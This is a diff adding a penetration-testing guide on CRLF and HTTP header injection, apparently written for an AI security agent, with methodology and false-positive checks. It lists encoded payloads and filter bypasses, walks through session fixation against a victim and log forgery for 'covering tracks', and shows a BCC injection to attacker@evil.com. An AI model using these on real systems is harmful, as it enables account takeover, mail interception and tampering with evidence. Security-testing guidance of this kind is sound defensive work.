@@ -1,0 +1,277 @@
+<crlf_header_injection_guide>
+<title>CRLF INJECTION AND HTTP HEADER INJECTION</title>
+
+<critical>CRLF injection allows attackers to inject HTTP headers by inserting carriage return (\r) and line feed (\n) characters into user input. This can lead to session fixation, cache poisoning, XSS via injected headers, and HTTP response splitting. While modern frameworks often mitigate this, legacy applications and certain contexts remain vulnerable.</critical>
+
+<scope>
+- Response header injection: Injecting new headers into HTTP response
+- Response splitting: Injecting entire HTTP response including body
+- Log injection: Forging log entries via CRLF in logged data
+- Header manipulation: Modifying existing headers via injection
+- Email header injection: CRLF in email headers adding recipients
+- Cookie injection: Setting cookies via Set-Cookie header injection
+</scope>
+
+<methodology>
+1. Identify inputs reflected in HTTP headers (Location, Set-Cookie, custom headers).
+2. Test CRLF injection with various encodings (%0d%0a, %0a, %0d, \r\n).
+3. Verify actual header injection in response (not just URL encoding visible).
+4. Demonstrate impact: XSS, session fixation, cache poisoning.
+5. Document the injection point and successful payload.
+6. Note framework/technology as most modern ones filter CRLF.
+</methodology>
+
+<discovery_techniques>
+<identify_reflection_points>
+Headers commonly reflecting user input:
+- Location: Redirect URLs, return URLs
+- Set-Cookie: Cookie values from parameters
+- Content-Disposition: Filename parameters
+- X-Custom-*: Application-specific headers
+- Access-Control-Allow-Origin: CORS origin reflection
+- Refresh: Meta refresh URLs
+</identify_reflection_points>
+
+<injection_payloads>
+Basic payloads:
+- `%0d%0aInjected-Header:value` (URL encoded)
+- `%0aInjected-Header:value` (LF only)
+- `%0dInjected-Header:value` (CR only)
+- `\r\nInjected-Header:value` (literal)
+- `%E5%98%8A%E5%98%8DInjected-Header:value` (UTF-8 encoded CRLF)
+- `%0d%0a%0d%0a<html>body</html>` (response splitting)
+
+Test both parameter and header values:
+- Query parameters: `?redirect=%0d%0aSet-Cookie:evil=1`
+- Form data: POST body with CRLF payloads
+- Header values: If custom headers are processed
+</injection_payloads>
+
+<bypass_techniques>
+- Double encoding: `%250d%250a`
+- Unicode variants: `%E5%98%8A` (UTF-8 CRLF lookalike)
+- Mixed encoding: `%0D%0a` (mixed case)
+- Null byte prefix: `%00%0d%0a`
+- Padding: `%20%0d%0a` (space before CRLF)
+- Alternative line endings: `%0d` or `%0a` alone
+</bypass_techniques>
+</discovery_techniques>
+
+<injection_types>
+<header_injection>
+Inject new response header:
+```
+GET /redirect?url=http://example.com%0d%0aX-Injected:pwned HTTP/1.1
+
+Response:
+HTTP/1.1 302 Found
+Location: http://example.com
+X-Injected: pwned
+```
+</header_injection>
+
+<cookie_injection>
+Set arbitrary cookies:
+```
+GET /redirect?url=http://example.com%0d%0aSet-Cookie:session=attacker HTTP/1.1
+
+Response:
+HTTP/1.1 302 Found
+Location: http://example.com
+Set-Cookie: session=attacker
+```
+</cookie_injection>
+
+<response_splitting>
+Inject entire response (classic, rare in modern servers):
+```
+GET /redirect?url=http://example.com%0d%0a%0d%0a<html><script>alert(1)</script></html> HTTP/1.1
+
+Response:
+HTTP/1.1 302 Found
+Location: http://example.com
+
+<html><script>alert(1)</script></html>
+```
+Note: Most modern servers prevent this by blocking CRLF before body.
+</response_splitting>
+
+<xss_via_headers>
+Some browsers execute JavaScript in certain headers:
+```
+GET /redirect?url=%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1
+```
+Changes Content-Type and injects body with XSS.
+</xss_via_headers>
+</injection_types>
+
+<exploitation>
+<session_fixation>
+1. Find CRLF injection in redirect parameter
+2. Inject Set-Cookie with session ID you know
+3. Send link to victim: `https://target.com/login?return=%0d%0aSet-Cookie:session=KNOWN`
+4. Victim logs in, session=KNOWN is set
+5. Attacker uses session=KNOWN to access victim's account
+</session_fixation>
+
+<cache_poisoning_via_crlf>
+1. Find CRLF injection in cached response
+2. Inject headers that poison the cache: `X-Injected: <script>alert(1)</script>`
+3. If response is cached, XSS affects all users
+4. Combine with cache poisoning techniques
+</cache_poisoning_via_crlf>
+
+<log_injection>
+1. Find input that appears in logs
+2. Inject CRLF to create fake log entries:
+   `legitimate%0d%0a192.168.1.1 - admin [date] "GET /admin HTTP/1.1" 200`
+3. Can forge successful login attempts, admin actions
+4. Useful for covering tracks or framing others
+</log_injection>
+
+<email_header_injection>
+In email sending functionality:
+```
+To: victim@example.com%0d%0aBcc:attacker@evil.com
+```
+Adds BCC recipient to receive copy of email.
+```
+Subject: Hello%0d%0a%0d%0aEmail body here
+```
+Injects email body, bypassing intended content.
+</email_header_injection>
+</exploitation>
+
+<validation>
+1. Verify injected header appears in actual HTTP response (use proxy/curl).
+2. Confirm CRLF is not just URL-encoded display (%0d%0a visible vs actually splitting).
+3. Demonstrate impact: session fixation, XSS, cache poisoning.
+4. Test from different clients to ensure server-side injection.
+5. Document framework/technology and note that modern ones typically prevent this.
+6. Distinguish from client-side display issues.
+</validation>
+
+<false_positives>
+- CRLF visible in response but not interpreted (URL encoded, escaped)
+- Framework sanitizing CRLF before header construction
+- Injection in body/HTML, not headers (may be different vulnerability)
+- Browser display issues, not actual header injection
+- CRLF in logs but not affecting log parsing/interpretation
+- Email content, not headers (not header injection)
+</false_positives>
+
+<llm_reasoning_errors>
+COMMON AI MISTAKES THAT CAUSE FALSE POSITIVES - AVOID THESE:
+
+1. URL ENCODING DISPLAY VS INTERPRETATION:
+   WRONG: "Response shows %0d%0a in Location header, CRLF injection confirmed"
+   RIGHT: The literal characters "%0d%0a" appearing in output is NOT injection:
+          - This is URL-encoded display, not interpreted CRLF
+          - True injection shows ACTUAL line breaks in response
+          - Use raw HTTP response viewer, not URL-decoded display
+          Check raw bytes: 0x0d 0x0a vs literal "%0d%0a".
+
+2. FRAMEWORK SANITIZATION:
+   WRONG: "Input reflects in header, must be injectable"
+   RIGHT: Modern frameworks automatically sanitize CRLF:
+          - Java: Most libraries strip/reject CRLF in headers
+          - Python: Standard libraries validate header values
+          - Node.js: Express and others block CRLF
+          - Go: net/http validates header content
+          Test actual injection, don't assume based on reflection.
+
+3. BODY INJECTION CONFUSION:
+   WRONG: "CRLF payload appears in response body, header injection"
+   RIGHT: CRLF in response BODY is:
+          - HTML/text content, not header injection
+          - Different impact (may be XSS in HTML context)
+          - Not CRLF header injection specifically
+          Headers end at first blank line (CRLF CRLF).
+
+4. CLIENT-SIDE ONLY:
+   WRONG: "Browser shows new header line in dev tools, injection confirmed"
+   RIGHT: Some tools may display/format incorrectly:
+          - Use curl -i or raw socket to verify
+          - Browser dev tools may normalize display
+          - Check actual wire format
+          Server-side verification required.
+
+5. LOG INJECTION SEVERITY:
+   WRONG: "Can inject CRLF into application logs, critical vulnerability"
+   RIGHT: Log injection severity depends on:
+          - Whether logs are parsed/executed (SIEM, automation)
+          - Whether fake entries are distinguishable
+          - Actual impact (usually low unless log-based automation)
+          Often informational unless concrete exploit path exists.
+
+6. EMAIL BODY VS HEADER:
+   WRONG: "Newlines in email content, email header injection"
+   RIGHT: Newlines in email BODY are normal:
+          - Header injection requires injection BEFORE body
+          - Body starts after blank line (CRLF CRLF)
+          - Injection must affect To, CC, BCC, Subject lines
+          Distinguish header injection from body content.
+</llm_reasoning_errors>
+
+<expanded_false_positives>
+FALSE POSITIVE SCENARIOS - DO NOT REPORT:
+
+1. SANITIZED OUTPUT:
+   - Framework escaping CRLF characters
+   - "%0d%0a" displayed literally (URL encoded, not interpreted)
+   - "\r\n" shown as escaped characters
+   - Header values properly encoded before output
+
+2. BODY CONTENT:
+   - CRLF appearing in HTML body (different vulnerability class)
+   - Text/JSON response with line breaks (intended)
+   - Error messages containing input with CRLF
+
+3. CLIENT-SIDE DISPLAY:
+   - Browser normalizing header display
+   - Proxy tool formatting issues
+   - Dev tools display vs actual response
+
+4. MODERN FRAMEWORKS:
+   - Spring/Spring Boot (sanitizes by default)
+   - Express.js (validates header values)
+   - Django (escapes header values)
+   - Rails (sanitizes headers)
+   - Unless specific vulnerable version/configuration
+
+5. LOW-IMPACT SCENARIOS:
+   - Log injection without execution/parsing impact
+   - Email body line breaks (not header injection)
+   - CRLF in filenames (may be different issue)
+
+6. TESTING ARTIFACTS:
+   - Development mode with relaxed validation
+   - Debugging features showing raw input
+   - Test endpoints with intentional reflection
+</expanded_false_positives>
+
+<impact>
+- Session fixation: Set known session ID for victim
+- XSS: Inject script via Content-Type or response body
+- Cache poisoning: Inject headers causing cache pollution
+- Cookie theft: Set cookies with attacker-controlled values
+- Open redirect: Inject Location header with malicious URL
+- Log forgery: Create fake log entries
+- Email abuse: Add recipients, modify email content
+</impact>
+
+<pro_tips>
+1. Use curl -i or raw HTTP tools to verify actual header injection, not browser display.
+2. Modern frameworks mostly prevent this; focus on legacy apps or custom header handling.
+3. Try multiple encodings: URL encoding, double encoding, Unicode variants.
+4. Check both CR and LF separately - some servers filter one but not other.
+5. Email header injection is still common in contact forms and notification features.
+6. Log injection is usually low severity unless logs drive automated actions.
+7. Response splitting (full response injection) is rare in modern servers.
+8. Session fixation via CRLF requires the application to accept the injected cookie.
+9. Cache poisoning via CRLF requires the response to be cacheable.
+10. Test with netcat or openssl s_client for precise control over bytes sent.
+</pro_tips>
+
+<remember>CRLF injection requires demonstrating actual header injection in the raw HTTP response, not just URL-encoded characters appearing in output. Modern frameworks typically sanitize this automatically. Verify with raw HTTP inspection and demonstrate concrete impact like session fixation or cache poisoning.</remember>
+</crlf_header_injection_guide>
